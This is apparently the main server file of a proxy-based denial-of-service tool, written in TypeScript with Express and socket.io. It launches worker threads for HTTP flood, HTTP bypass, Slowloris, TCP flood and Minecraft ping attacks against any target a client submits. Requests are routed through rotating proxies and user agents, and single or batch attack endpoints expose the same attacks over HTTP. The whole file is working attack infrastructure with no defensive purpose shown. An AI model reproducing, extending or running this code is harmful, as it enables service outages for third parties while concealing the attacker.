import express from "express";
import { readFileSync, writeFileSync } from "fs";
import { createServer } from "http";
import { dirname, join } from "path";
import { Server } from "socket.io";
import { fileURLToPath } from "url";
import { Worker } from "worker_threads";

import bodyParser from "body-parser";
import { currentPath, loadProxies, loadUserAgents } from "./fileLoader";
import { AttackMethod } from "./lib";
import { filterProxies } from "./proxyUtils";
import { sendSingleRequest, sendBatchRequests } from "./utils/singleRequestUtils.js";

// Define the workers based on attack type
const attackWorkers: { [key in AttackMethod]: string } = {
  http_flood: "./workers/httpFloodAttack.js",
  http_bypass: "./workers/httpBypassAttack.js",
  http_slowloris: "./workers/httpSlowlorisAttack.js",
  tcp_flood: "./workers/tcpFloodAttack.js",
  minecraft_ping: "./workers/minecraftPingAttack.js",
};

const __filename = fileURLToPath(import.meta.url);
const __dirname = dirname(__filename);
const __prod = process.env.NODE_ENV === "production";

const app = express();
const httpServer = createServer(app);
const io = new Server(httpServer, {
  cors: {
    origin: __prod ? "" : "http://localhost:5173",
    methods: ["GET", "POST"],
    allowedHeaders: ["Content-Type"],
  },
});

const proxies = loadProxies();
const userAgents = loadUserAgents();

console.log("Proxies loaded:", proxies.length);
console.log("User agents loaded:", userAgents.length);

app.use(express.static(join(__dirname, "public")));

io.on("connection", (socket) => {
  console.log("Client connected");

  socket.emit("stats", {
    pps: 0,
    bots: proxies.length,
    totalPackets: 0,
    log: "🍤 Connected to the server.",
  });

  socket.on("startAttack", (params) => {
    const { target, duration, packetDelay, attackMethod, packetSize } = params;
    const filteredProxies = filterProxies(proxies, attackMethod);
    const attackWorkerFile = attackWorkers[attackMethod];

    if (!attackWorkerFile) {
      socket.emit("stats", {
        log: `❌ Unsupported attack type: ${attackMethod}`,
      });
      return;
    }

    socket.emit("stats", {
      log: `🍒 Using ${filteredProxies.length} filtered proxies to perform attack.`,
      bots: filteredProxies.length,
    });

    const worker = new Worker(join(__dirname, attackWorkerFile), {
      workerData: {
        target,
        proxies: filteredProxies,
        userAgents,
        duration,
        packetDelay,
        packetSize,
      },
    });

    worker.on("message", (message) => socket.emit("stats", message));

    worker.on("error", (error) => {
      console.error(`Worker error: ${error.message}`);
      socket.emit("stats", { log: `❌ Worker error: ${error.message}` });
    });

    worker.on("exit", (code) => {
      console.log(`Worker exited with code ${code}`);
      socket.emit("attackEnd");
    });

    socket["worker"] = worker;
  });

  socket.on("stopAttack", () => {
    const worker = socket["worker"];
    if (worker) {
      worker.terminate();
      socket.emit("attackEnd");
    }
  });

  socket.on("disconnect", () => {
    const worker = socket["worker"];
    if (worker) {
      worker.terminate();
    }
    console.log("Client disconnected");
  });
});

app.get("/configuration", (req, res) => {
  res.setHeader("Access-Control-Allow-Origin", "http://localhost:5173");
  res.setHeader("Content-Type", "application/json");

  const proxiesText = readFileSync(
    join(currentPath(), "data", "proxies.txt"),
    "utf-8"
  );
  const uasText = readFileSync(join(currentPath(), "data", "uas.txt"), "utf-8");

  res.send({
    proxies: btoa(proxiesText),
    uas: btoa(uasText),
  });
});

app.options("/configuration", (req, res) => {
  res.setHeader("Access-Control-Allow-Origin", "http://localhost:5173");
  res.setHeader("Access-Control-Allow-Methods", "POST, OPTIONS");
  res.setHeader("Access-Control-Allow-Headers", "Content-Type");
  res.send();
});

app.post("/configuration", bodyParser.json(), (req, res) => {
  res.setHeader("Access-Control-Allow-Methods", "POST");
  res.setHeader("Access-Control-Allow-Headers", "Content-Type");
  res.setHeader("Access-Control-Allow-Origin", "http://localhost:5173");
  res.setHeader("Content-Type", "application/text");

  // console.log(req.body)

  // atob and btoa are used to avoid the problems in sending data with // characters, etc.
  const proxies = atob(req.body["proxies"]);
  const uas = atob(req.body["uas"]);
  writeFileSync(join(currentPath(), "data", "proxies.txt"), proxies, {
    encoding: "utf-8",
  });
  writeFileSync(join(currentPath(), "data", "uas.txt"), uas, {
    encoding: "utf-8",
  });

  res.send("OK");
});

// Single request endpoint for idle game mechanics
app.post("/api/attack/single", bodyParser.json(), async (req, res) => {
  res.setHeader("Access-Control-Allow-Origin", "http://localhost:5173");
  res.setHeader("Content-Type", "application/json");

  const { target, method, packetSize } = req.body;

  if (!target || !method) {
    return res.status(400).json({ success: false, message: "Missing target or method" });
  }

  // Select random proxy and user agent
  const filteredProxies = filterProxies(proxies, method as AttackMethod);
  if (filteredProxies.length === 0) {
    return res.status(500).json({ success: false, message: "No proxies available for this method" });
  }

  const proxy = filteredProxies[Math.floor(Math.random() * filteredProxies.length)];
  const userAgent = userAgents[Math.floor(Math.random() * userAgents.length)];

  try {
    const result = await sendSingleRequest({
      target,
      method,
      packetSize: packetSize || 64,
      proxy,
      userAgent
    });

    res.json(result);
  } catch (error: any) {
    res.status(500).json({ success: false, message: error.message });
  }
});

// Batch request endpoint for high RPS scenarios
app.post("/api/attack/batch", bodyParser.json(), async (req, res) => {
  res.setHeader("Access-Control-Allow-Origin", "http://localhost:5173");
  res.setHeader("Content-Type", "application/json");

  const { target, method, packetSize, count } = req.body;

  if (!target || !method || !count) {
    return res.status(400).json({ success: false, message: "Missing required parameters" });
  }

  if (count > 100) {
    return res.status(400).json({ success: false, message: "Batch size cannot exceed 100" });
  }

  const filteredProxies = filterProxies(proxies, method as AttackMethod);
  if (filteredProxies.length === 0) {
    return res.status(500).json({ success: false, message: "No proxies available for this method" });
  }

  try {
    const result = await sendBatchRequests({
      target,
      method,
      packetSize: packetSize || 64,
      count,
      proxies: filteredProxies,
      userAgents
    });

    res.json({ success: true, ...result });
  } catch (error: any) {
    res.status(500).json({ success: false, message: error.message });
  }
});

// CORS preflight for new endpoints
app.options("/api/attack/single", (req, res) => {
  res.setHeader("Access-Control-Allow-Origin", "http://localhost:5173");
  res.setHeader("Access-Control-Allow-Methods", "POST, OPTIONS");
  res.setHeader("Access-Control-Allow-Headers", "Content-Type");
  res.send();
});

app.options("/api/attack/batch", (req, res) => {
  res.setHeader("Access-Control-Allow-Origin", "http://localhost:5173");
  res.setHeader("Access-Control-Allow-Methods", "POST, OPTIONS");
  res.setHeader("Access-Control-Allow-Headers", "Content-Type");
  res.send();
});

const PORT = parseInt(process.env.PORT || "3000");
httpServer.listen(PORT, () => {
  if (__prod) {
    console.log(
      `(Production Mode) Client and server is running under http://localhost:${PORT}`
    );
  } else {
    console.log(`Server is running under development port ${PORT}`);
  }
});
